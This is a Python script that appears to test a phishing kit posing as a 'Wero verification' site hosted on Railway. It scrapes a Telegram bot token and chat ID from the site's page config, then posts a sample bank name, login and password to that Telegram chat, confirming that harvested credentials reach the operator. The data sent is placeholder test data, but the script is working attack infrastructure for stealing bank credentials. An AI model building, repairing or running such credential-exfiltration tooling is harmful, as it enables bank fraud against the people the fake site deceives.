import requests
import re
from datetime import datetime

RAILWAY_URL = "https://weroverificationeu-production.up.railway.app"
TEST_PAGE = f"{RAILWAY_URL}/test_manual.html"

print("=" * 70)
print("WERO TELEGRAM - FULL FORM TEST AUTOMATION")
print("=" * 70)
print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print()

# Step 1: Extract tokens from Railway
print("[1/3] Extracting tokens from Railway...")
response = requests.get(TEST_PAGE, timeout=10)

config_pattern = r'window\.telegramConfig\s*=\s*\{([^}]+)\}'
match = re.search(config_pattern, response.text, re.DOTALL)

if not match:
    print("[ERROR] Config not found!")
    exit(1)

config_content = match.group(1)
bot_token = re.search(r'BOT_TOKEN:\s*["\']([^"\']+)["\']', config_content).group(1)
chat_id = re.search(r'CHAT_ID:\s*["\'](\d+)["\']', config_content).group(1)

print(f"[OK] Tokens extracted")
print(f"  BOT_TOKEN: {bot_token[:10]}... (len: {len(bot_token)})")
print(f"  CHAT_ID: {chat_id}")
print()

# Step 2: Simulate form submission
print("[2/3] Simulating form submission with test data...")

test_data = {
    "bank": "WERO AUTOMATION TEST",
    "login": "test.user.automation@wero.fr",
    "password": "SecurePassword123!@#"
}

print(f"  Bank: {test_data['bank']}")
print(f"  Login: {test_data['login']}")
print(f"  Password: {'*' * len(test_data['password'])}")
print()

# Step 3: Send to Telegram
print("[3/3] Sending form data to Telegram...")

message = f"""
WERO FORM SUBMISSION - AUTOMATION TEST
{'='*50}
Bank: {test_data['bank']}
Login: {test_data['login']}
Password: {test_data['password']}

Timestamp: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
Source: Railway Automation Test
{'='*50}
"""

try:
    tg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message
    }
    
    response = requests.post(tg_url, json=payload, timeout=10)
    data = response.json()
    
    if data.get('ok'):
        print("[SUCCESS] Form data sent to Telegram!")
        print()
        print(f"Message ID: {data['result']['message_id']}")
        print(f"Chat ID: {data['result']['chat']['id']}")
        print(f"Date: {datetime.fromtimestamp(data['result']['date']).strftime('%Y-%m-%d %H:%M:%S')}")
        print()
        print("=" * 70)
        print("CHECK YOUR TELEGRAM NOW!")
        print("You should receive the form submission with:")
        print(f"  - Bank: {test_data['bank']}")
        print(f"  - Login: {test_data['login']}")
        print(f"  - Password: {test_data['password']}")
        print("=" * 70)
    else:
        print(f"[ERROR] {data.get('description')}")
except Exception as e:
    print(f"[ERROR] {e}")
